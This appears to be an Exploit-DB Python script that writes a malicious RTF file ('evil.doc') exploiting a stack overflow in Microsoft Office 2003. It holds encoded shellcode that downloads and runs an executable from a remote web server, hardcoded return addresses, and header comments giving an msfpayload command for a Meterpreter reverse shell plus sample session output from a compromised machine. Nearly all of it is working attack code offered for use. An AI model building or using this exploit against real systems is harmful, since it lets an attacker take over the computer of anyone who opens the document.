#!/usr/bin/python

#
# Note from the Exploit-DB team: This might be the same bug as:
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/fileformat/ms10_087_rtf_pfragments_bof.rb
#

#-----------------------------------------------------------------------------------#
# Exploit: Microsoft Office 2003 Home/Pro 0day - Tested on XP SP1,2.3               #
# Authors: b33f (Ruben Boonen) && g11tch (Chris Hodges)                             #
#####################################################################################
# One shellcode to rule them all, One shellcode to find them, One shellcode to      #
# bring them all and in the darkness bind them!!                                    #
#                                                                                   #
# Greetings: offsec, corelan, setoolkit                                             #
#####################################################################################
# (1) root@bt:~/Desktop/office# ./office2003.py                                     #
#     root@bt:~/Desktop/office# mv evil.doc /var/www/                               #
#                                                                                   #
# (2) msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=9988 X #
#     > /var/www/magic.exe                                                          #
#                                                                                   #
# (3) msf  exploit(handler) > exploit                                               #
#                                                                                   #
#    [*] Started reverse handler on 192.168.111.132:9988                            #
#    [*] Starting the payload handler...                                            #
#    [*] Sending stage (752128 bytes) to 192.168.111.128                            #
#    [*] Meterpreter session 1 opened (192.168.111.132:9988 -> 192.168.111.128:1073)#
#        at 2012-01-08 18:46:26 +0800                                               #
#                                                                                   #
#    meterpreter > ipconfig                                                         #
#                                                                                   #
#    MS TCP Loopback interface                                                      #
#    Hardware MAC: 00:00:00:00:00:00                                                #
#    IP Address  : 127.0.0.1                                                        #
#    Netmask     : 255.0.0.0                                                        #
#                                                                                   #
#   AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport               #
#   Hardware MAC: 00:0c:29:6c:92:42                                                 #
#   IP Address  : 192.168.111.128                                                   #
#   Netmask     : 255.255.255.0                                                     #
#-----------------------------------------------------------------------------------#

import binascii

filename = "evil.doc"

#-----------------------------------------------------------------------------------#
# File Structure                                                                    #
#-----------------------------------------------------------------------------------#
file = (
"{\\rt##{\shp{\sp}}{\shp{\sp}}{\shp{\sp}}{\shp{\*\shpinst\shpfhdr0\shpbxcolumn\s"
"hpbypara\sh pwr2}{\sp{\sn {}{}{\sn}{\sn}{\*\*}pFragments}{\*\*\*}{\sv{\*\*\*\*\*"
"\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}9;2;ffffffffff")

#-----------------------------------------------------------------------------------#
# Open raw socket to download payload to parent directory as "a.exe"                #
# ==> cmd execute "a.exe"                                                           #
#-----------------------------------------------------------------------------------#
magic = (
"\x65\x62\x37\x37\x33\x31\x63\x39\x36\x34\x38\x62\x37\x31\x33\x30"
"\x38\x62\x37\x36\x30\x63\x38\x62\x37\x36\x31\x63\x38\x62\x35\x65"
"\x30\x38\x38\x62\x37\x65\x32\x30\x38\x62\x33\x36\x36\x36\x33\x39"
"\x34\x66\x31\x38\x37\x35\x66\x32\x63\x33\x36\x30\x38\x62\x36\x63"
"\x32\x34\x32\x34\x38\x62\x34\x35\x33\x63\x38\x62\x35\x34\x30\x35"
"\x37\x38\x30\x31\x65\x61\x38\x62\x34\x61\x31\x38\x38\x62\x35\x61"
"\x32\x30\x30\x31\x65\x62\x65\x33\x33\x34\x34\x39\x38\x62\x33\x34"
"\x38\x62\x30\x31\x65\x65\x33\x31\x66\x66\x33\x31\x63\x30\x66\x63"
"\x61\x63\x38\x34\x63\x30\x37\x34\x30\x37\x63\x31\x63\x66\x30\x64"
"\x30\x31\x63\x37\x65\x62\x66\x34\x33\x62\x37\x63\x32\x34\x32\x38"
"\x37\x35\x65\x31\x38\x62\x35\x61\x32\x34\x30\x31\x65\x62\x36\x36"
"\x38\x62\x30\x63\x34\x62\x38\x62\x35\x61\x31\x63\x30\x31\x65\x62"
"\x38\x62\x30\x34\x38\x62\x30\x31\x65\x38\x38\x39\x34\x34\x32\x34"
"\x31\x63\x36\x31\x63\x33\x65\x38\x39\x32\x66\x66\x66\x66\x66\x66"
"\x35\x66\x38\x31\x65\x66\x39\x38\x66\x66\x66\x66\x66\x66\x65\x62"
"\x30\x35\x65\x38\x65\x64\x66\x66\x66\x66\x66\x66\x36\x38\x38\x65"
"\x34\x65\x30\x65\x65\x63\x35\x33\x65\x38\x39\x34\x66\x66\x66\x66"
"\x66\x66\x33\x31\x63\x39\x36\x36\x62\x39\x36\x66\x36\x65\x35\x31"
"\x36\x38\x37\x35\x37\x32\x36\x63\x36\x64\x35\x34\x66\x66\x64\x30"
"\x36\x38\x33\x36\x31\x61\x32\x66\x37\x30\x35\x30\x65\x38\x37\x61"
"\x66\x66\x66\x66\x66\x66\x33\x31\x63\x39\x35\x31\x35\x31\x38\x64"
"\x33\x37\x38\x31\x63\x36\x65\x65\x66\x66\x66\x66\x66\x66\x38\x64"
"\x35\x36\x30\x63\x35\x32\x35\x37\x35\x31\x66\x66\x64\x30\x36\x38"
"\x39\x38\x66\x65\x38\x61\x30\x65\x35\x33\x65\x38\x35\x62\x66\x66"
"\x66\x66\x66\x66\x34\x31\x35\x31\x35\x36\x66\x66\x64\x30\x36\x38"
"\x37\x65\x64\x38\x65\x32\x37\x33\x35\x33\x65\x38\x34\x62\x66\x66"
"\x66\x66\x66\x66\x66\x66\x64\x30\x36\x33\x36\x64\x36\x34\x32\x65"
"\x36\x35\x37\x38\x36\x35\x32\x30\x32\x66\x36\x33\x32\x30\x32\x30"
"\x36\x31\x32\x65\x36\x35\x37\x38\x36\x35\x30\x30")

#------------------------------------------------------------------------------------------------------------------------------#
# Two versions of office 2003 floating around:                                                                                 #
# (1) Standalone version, (2) XP Service Pack upgrade                                                                          #
################################################################################################################################
# Unfortunatly though the exploit works perfectly for both versions they require different pointers to ESP...                  #
#                                                                                                                              #
# (1) 0x30324366 - CALL ESP - WINWORD.exe => "\x36\x36\x34\x33\x33\x32\x33\x30"                                                #
# => http://download.microsoft.com/download/6/2/3/6233A257-16BD-4C8D-BF4C-6FA59AF9213A/OfficeSTD.exe                           #
#                                                                                                                              #
# (2) 0x30402655 - PUSH ESP -> RETN - WINWORD.exe => "\x35\x35\x32\x36\x34\x30\x33\x30"                                        #
# => http://download.microsoft.com/download/7/7/8/778493c2-ace3-44c5-8bc3-d102da80e0f6/Office2003SP3-KB923618-FullFile-ENU.exe #
#------------------------------------------------------------------------------------------------------------------------------#

EIP = "\x36\x36\x34\x33\x33\x32\x33\x30" #should ascii convert the Little Endian pointer

filler = "\x30\x30\x30\x30\x38\x30\x37\x63"*2 + "\x41"*24 + "\x39\x30"*18

buffer = "\x23"*501 + "\x30\x35" + "\x30"*40 + EIP + filler + magic

#-----------------------------------------------------------------------------------#
# Since we are downloading our payload from a remote webserver there are no         #
# restrictions on payload size or badcharacters...                                  #
#-----------------------------------------------------------------------------------#

URL = "http://192.168.111.132/magic.exe"
binnu = binascii.b2a_hex(URL)

URL2 = "00"
nxt="{}}}}}}"
nxt+="\x0d\x0a"
nxt+="}"

textfile = open(filename , 'w')
textfile.write(file+buffer+binnu+URL2+nxt)
textfile.close()